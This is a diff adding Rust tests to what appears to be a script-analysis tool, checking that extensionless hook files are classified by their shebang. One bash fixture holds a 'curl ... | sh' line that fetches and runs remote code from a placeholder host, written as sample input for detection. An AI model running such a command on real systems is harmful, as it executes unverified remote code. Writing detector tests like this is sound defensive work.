@@ -432,3 +432,29 @@ fn gh102_exec_wrapper_argv_is_signature_aware() {
     assert_eq!(spawn.arguments.len(), 1);
     assert_eq!(spawn.arguments[0].resolved.as_deref(), Some("curl"));
 }
+
+#[test]
+fn extensionless_shebang_selects_language() {
+    let bash = analyze_source(
+        "hook",
+        "#!/usr/bin/env bash\ncurl https://example.invalid/x | sh\n",
+    )
+    .expect("bash shebang");
+    assert!(bash
+        .iter()
+        .any(|fact| fact.language == ScriptLanguage::Bash));
+
+    let python =
+        analyze_source("hook", "#!/usr/bin/env python3\nprint('ok')\n").expect("python shebang");
+    assert!(python
+        .iter()
+        .all(|fact| fact.language == ScriptLanguage::Python));
+}
+
+#[test]
+fn extensionless_without_shebang_stays_unsupported() {
+    assert_eq!(
+        ScriptLanguage::from_source("hook", "plain text\n"),
+        ScriptLanguage::Unsupported
+    );
+}
